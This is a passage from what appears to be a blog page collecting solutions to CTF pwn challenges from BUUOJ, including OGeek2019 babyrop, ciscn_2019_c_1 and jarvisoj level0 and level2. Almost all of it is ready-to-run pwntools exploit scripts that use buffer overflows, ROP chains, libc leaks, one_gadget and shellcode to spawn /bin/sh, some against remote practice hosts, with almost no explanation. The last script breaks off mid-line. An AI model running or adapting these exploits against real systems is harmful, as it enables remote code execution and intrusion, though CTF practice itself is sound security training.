class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line"></span><br><span class="line">#p &#x3D; remote()</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;pwn2&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;pwn2&#39;)</span><br><span class="line"></span><br><span class="line">bss &#x3D; 0x0601060</span><br><span class="line">rdi &#x3D; 0x0000000000400693</span><br><span class="line">x &#x3D; 0x00400001</span><br><span class="line">ret &#x3D; 0x00000000004004ae</span><br><span class="line"></span><br><span class="line">payload &#x3D; p64(rdi) + p64(x)+ p64(x) + asm(shellcraft.sh()) </span><br><span class="line"></span><br><span class="line">#payload &#x3D;  asm(shellcraft.sh())</span><br><span class="line">p.recvuntil(&#39;bss:\n&#39;)</span><br><span class="line">p.sendline(payload.ljust(112,&#39;a&#39;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 &#x3D; &#39;a&#39;*(0xa+8)  + p64(x)</span><br><span class="line">p.recvuntil(&#39;stack:\n&#39;)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-09-OGeek2019-babyrop-sovle"><a href="#NO-09-OGeek2019-babyrop-sovle" class="headerlink" title="NO.09 OGeek2019_babyrop_sovle"></a>NO.09 OGeek2019_babyrop_sovle</h1><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;[OGeek2019]babyrop&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;[OGeek2019]babyrop&#39;)</span><br><span class="line">libc &#x3D; ELF(&#39;libc-2.23.so&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,28661)</span><br><span class="line">elf &#x3D; ELF(&#39;[OGeek2019]babyrop&#39;)</span><br><span class="line">libc &#x3D; ELF(&#39;libc-2.23.so&#39;)</span><br><span class="line"></span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line"></span><br><span class="line">main_addr &#x3D; 0x08048825</span><br><span class="line"></span><br><span class="line">payload1 &#x3D; &#39;\x00&#39;+ &#39;\xff&#39;*7</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(&#39;Correct\n&#39;)</span><br><span class="line"></span><br><span class="line">payload2 &#x3D; &#39;a&#39;* (0xe7+4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">write_addr &#x3D; u32(p.recv(4))</span><br><span class="line">offset &#x3D; write_addr - libc.sym[&#39;write&#39;]</span><br><span class="line">system_addr &#x3D; libc.sym[&#39;system&#39;] + offset</span><br><span class="line">binsh &#x3D; libc.search(&#39;&#x2F;bin&#x2F;sh&#39;).next() + offset</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(&#39;Correct\n&#39;)</span><br><span class="line"></span><br><span class="line">payload3 &#x3D; &#39;a&#39;*(0xe7+4) + p32(system_addr) + &#39;aaaa&#39; + p32(binsh)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-10-铁人三项-第五赛区-2018-rop-sovle"><a href="#NO-10-铁人三项-第五赛区-2018-rop-sovle" class="headerlink" title="NO.10 铁人三项(第五赛区)_2018_rop_sovle"></a>NO.10 铁人三项(第五赛区)_2018_rop_sovle</h1><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;i386&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,29800)</span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;铁人三项(第五赛区)_2018_rop&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;铁人三项(第五赛区)_2018_rop&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_plt&#x3D;elf.plt[&#39;write&#39;]</span><br><span class="line">read_plt&#x3D;elf.plt[&#39;read&#39;]</span><br><span class="line">main_addr&#x3D;elf.symbols[&#39;main&#39;]</span><br><span class="line">bss_addr&#x3D;elf.symbols[&#39;__bss_start&#39;]</span><br><span class="line">def leak(address):</span><br><span class="line">        payload1&#x3D;&#39;a&#39;*(0x88+0x4)+p32(write_plt)+p32(main_addr)+p32(0x1)+p32(address)+p32(0x4)</span><br><span class="line">        p.sendline(payload1)</span><br><span class="line">        leak_address&#x3D;p.recv(4)</span><br><span class="line">        return leak_address</span><br><span class="line"></span><br><span class="line">d&#x3D;DynELF(leak,elf&#x3D;ELF(&#39;铁人三项(第五赛区)_2018_rop&#39;))</span><br><span class="line">sys_addr&#x3D;d.lookup(&#39;system&#39;,&#39;libc&#39;)</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;a&#39;*(0x88+0x4)+p32(read_plt)+p32(main_addr)+p32(0x0)+p32(bss_addr)+p32(0x8)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendline(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line"></span><br><span class="line">payload3&#x3D;&#39;a&#39;*(0x88+0x4)+p32(sys_addr)+p32(main_addr)+p32(bss_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="NO-11-bjdctf-2020-babyrop-sovle"><a href="#NO-11-bjdctf-2020-babyrop-sovle" class="headerlink" title="NO.11 bjdctf_2020_babyrop_sovle"></a>NO.11 bjdctf_2020_babyrop_sovle</h1><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;bjdctf_2020_babyrop&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;bjdctf_2020_babyrop&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26680)</span><br><span class="line">elf &#x3D; ELF(&#39;bjdctf_2020_babyrop&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#39;)</span><br><span class="line">junk &#x3D; 32</span><br><span class="line">popr &#x3D; 0x0000000000400733</span><br><span class="line"></span><br><span class="line">puts_got &#x3D; elf.got[&quot;puts&quot;]</span><br><span class="line">puts_plt &#x3D; elf.symbols[&quot;puts&quot;]</span><br><span class="line">read_plt &#x3D; elf.got[&quot;read&quot;]</span><br><span class="line">read_got &#x3D; elf.symbols[&quot;read&quot;]</span><br><span class="line">main_addr &#x3D; 0x04006AD</span><br><span class="line">start_addr &#x3D; 0x400530</span><br><span class="line">payload &#x3D; junk*&#39;A&#39;+&#39;BBBBBBBB&#39;+p64(popr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line">p.recvuntil(&quot;Pull up your sword and tell me u story!\n&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr &#x3D; u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">log.info(&quot;puts_addr:&quot;+hex(puts_addr))</span><br><span class="line">libc &#x3D; LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="line">offset &#x3D; puts_addr - libc.dump(&quot;puts&quot;)</span><br><span class="line">sys_addr &#x3D; offset+libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr &#x3D; offset+libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">payload &#x3D; junk*&#39;A&#39;+&#39;BBBBBBBB&#39;+p64(popr)+p64(binsh_addr)+p64(sys_addr)+p64(start_addr)</span><br><span class="line">p.recvuntil(&quot;Pull up your sword and tell me u story!\n&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-12-ciscn-2019-c-1-sovle"><a href="#NO-12-ciscn-2019-c-1-sovle" class="headerlink" title="NO.12 ciscn_2019_c_1_sovle"></a>NO.12 ciscn_2019_c_1_sovle</h1><h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,28138)</span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;ciscn_2019_c_1&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;ciscn_2019_c_1&#39;)</span><br><span class="line">libc &#x3D; ELF(&#39;libc-2.27.so&#39;)</span><br><span class="line"></span><br><span class="line">def send(pad):</span><br><span class="line">    print p.recvuntil(&#39;Input your choice!&#39;)</span><br><span class="line">    p.sendline(&#39;1&#39;)</span><br><span class="line">    print p.recvuntil(&#39;Input your Plaintext to be encrypted&#39;)</span><br><span class="line">    p.sendline(pad)</span><br><span class="line"></span><br><span class="line">padding &#x3D; 0x50+8</span><br><span class="line">pop_rdi_addr &#x3D; 0x400c83</span><br><span class="line">main_addr &#x3D; 0x0400B28</span><br><span class="line"></span><br><span class="line">__libc_start_main_got_addr &#x3D; elf.got[&#39;__libc_start_main&#39;]</span><br><span class="line">puts_plt_addr &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x50 + 8)</span><br><span class="line">payload +&#x3D; p64(pop_rdi_addr) </span><br><span class="line">payload +&#x3D; p64(__libc_start_main_got_addr) </span><br><span class="line">payload +&#x3D; p64(puts_plt_addr) </span><br><span class="line">payload +&#x3D; p64(main_addr)</span><br><span class="line"></span><br><span class="line">send(payload)</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">print p.recvline()    </span><br><span class="line">print p.recvline()   </span><br><span class="line">print p.recvline()</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">p.recvuntil(&#39;@\n&#39;)</span><br><span class="line">offest &#x3D; u64(p.recvline().strip().ljust(8,&#39;\x00&#39;)) - libc.sym[&#39;__libc_start_main&#39;]</span><br><span class="line"></span><br><span class="line">system_addr &#x3D; libc.sym[&#39;system&#39;] + offest</span><br><span class="line">bin_addr &#x3D; libc.search(&#39;&#x2F;bin&#x2F;sh&#39;).next() + offest</span><br><span class="line"></span><br><span class="line">ret &#x3D; 0x00000000004006b9</span><br><span class="line"></span><br><span class="line">payload1 &#x3D; &#39;a&#39;*padding+ p64(ret) + p64(pop_rdi_addr) + p64(bin_addr) + p64(system_addr) </span><br><span class="line">send(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-13-BJDCTF2nd-r2t3-sovle"><a href="#NO-13-BJDCTF2nd-r2t3-sovle" class="headerlink" title="NO.13 BJDCTF2nd_r2t3_sovle"></a>NO.13 BJDCTF2nd_r2t3_sovle</h1><h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 1</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;[BJDCTF 2nd]r2t3&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,29466)</span><br><span class="line"></span><br><span class="line">system_addr&#x3D;0x0804858B</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*8 + &#39;a&#39;*(0x9+0x4) + p32(system_addr) + &#39;a&#39;*(0x103-0x15-0x4) </span><br><span class="line"># 绕过范围 (3,8]，0x103 ~ 0x107 使用p.sendline()發送時多了一個換行符號 所以 0x103也可。</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;[+]Please input your name:\n&#39;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">print(hex(len(payload)))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-14-BJDCTF2nd-one-gadget-sovle"><a href="#NO-14-BJDCTF2nd-one-gadget-sovle" class="headerlink" title="NO.14 BJDCTF2nd_one_gadget_sovle"></a>NO.14 BJDCTF2nd_one_gadget_sovle</h1><h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;[BJDCTF 2nd]one_gadget&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,28292)</span><br><span class="line">elf &#x3D; ELF(&#39;[BJDCTF 2nd]one_gadget&#39;)</span><br><span class="line">libc &#x3D; ELF(&#39;libc-2.29.so&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget &#x3D; [0xe237f,0xe2383,0xe2386,0x106ef8]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;:0x&quot;)</span><br><span class="line">printf_addr &#x3D; int(p.recvuntil(&#39;\n&#39;),16)</span><br><span class="line">p.recvuntil(&#39;:&#39;)</span><br><span class="line"></span><br><span class="line">offest &#x3D; printf_addr - libc.sym[&#39;printf&#39;]</span><br><span class="line"></span><br><span class="line">payload &#x3D; one_gadget[3] + offest</span><br><span class="line">p.sendline(str(payload))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-15-jarvisoj-level0-sovle"><a href="#NO-15-jarvisoj-level0-sovle" class="headerlink" title="NO.15 jarvisoj_level0_sovle"></a>NO.15 jarvisoj_level0_sovle</h1><h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D; process(&#39;.&#x2F;jarvisoj_level0&#39;)</span><br><span class="line">#p &#x3D; remote(&#39;node3.buuoj.cn&#39;,27617)</span><br><span class="line">system_addr &#x3D; 0x400460</span><br><span class="line">binsh_addr &#x3D; 0x040059A</span><br><span class="line">sysfuntions_addr&#x3D; 0x00400596</span><br><span class="line">p.recvuntil(&#39;\n&#39;)</span><br><span class="line"></span><br><span class="line">#payload &#x3D; &#39;a&#39;*(0x80+8) + p64(sysfuntions_addr) # sovle1</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x80 +p64(system_addr) +p64(binsh_addr) # sovle2</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-16-HarekazeCTF2019-baby-rop-sovle"><a href="#NO-16-HarekazeCTF2019-baby-rop-sovle" class="headerlink" title="NO.16 HarekazeCTF2019_baby_rop_sovle"></a>NO.16 HarekazeCTF2019_baby_rop_sovle</h1><h3 id="exp-16"><a href="#exp-16" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 1</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;[HarekazeCTF2019]baby_rop&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,27724)</span><br><span class="line">elf &#x3D; ELF(&#39;[HarekazeCTF2019]baby_rop&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#39;)</span><br><span class="line">system_addr &#x3D; 0x00400490</span><br><span class="line">system_addr1 &#x3D; 0x04005E3</span><br><span class="line">sh_addr &#x3D; 0x0601048</span><br><span class="line"></span><br><span class="line">pop_rdi &#x3D; 0x0000000000400683</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x10+8) + p64(pop_rdi) + p64(sh_addr) + p64(system_addr)</span><br><span class="line">#payload &#x3D; &#39;a&#39;*(0x10+8) + p64(pop_rdi) + p64(sh_addr)+ p64(system_addr1)</span><br><span class="line">p.recvuntil(&quot;What&#39;s your name? &quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-17-jarvisoj-level2-sovle"><a href="#NO-17-jarvisoj-level2-sovle" class="headerlink" title="NO.17 jarvisoj_level2_sovle"></a>NO.17 jarvisoj_level2_sovle</h1><h3 id="exp-17"><a href="#exp-17" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 1</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;jarvisoj_level2&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,29779)</span><br><span class="line">#elf &#x3D; ELF(&#39;&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr &#x3D; 0x804845C</span><br><span class="line">system_addr1 &#x3D; 0x08048320</span><br><span class="line">binsh_addr &#x3D; 0x0804A024</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x88+4)+p32(system_addr)+p32(binsh_addr)</span><br><span class="line">#payload &#x3D; &#39;a&#39;*(0x88+4)+p32(system_addr1)+&#39;bbbb&#39;+p32(binsh_addr)</span><br><span class="line">p.recvuntil(&#39;\n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="NO-18-bjdctf-2020-babystack-sovle"><a href="#NO-18-bjdctf-2020-babystack-sovle" class="headerlink" title="NO.18 bjdctf_2020_babystack_sovle"></a>NO.18 bjdctf_2020_babystack_sovle</h1><h3 id="exp-18"><a href="#exp-18" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;bjdctf_2020_babystack&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26095)</span><br><span class="line">#elf &#x3D; ELF(&#39;bjdctf_2020_babystack&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;libc&#x2F;ubuntu16&#x2F;64&#x2F;libc-2.23.so&#39;)</span><br><span class="line"></span><br><span class="line">binsh_addr &#x3D; 0x0004006E6</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x10) +p64(0x123123)+ p64(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendafter(&#39;Please input the length of your name:\n&#39;,str(123123)+&#39;\n&#39;)</span><br><span class="line">p.sendafter(&quot;What&#39;s u name?\n&quot;,payload+&#39;\n&#39;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-19-ciscn-2019-n-5-sovle"><a href="#NO-19-ciscn-2019-n-5-sovle" class="headerlink" title="NO.19 ciscn_2019_n_5_sovle"></a>NO.19 ciscn_2019_n_5_sovle</h1><h3 id="exp-19"><a href="#exp-19" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 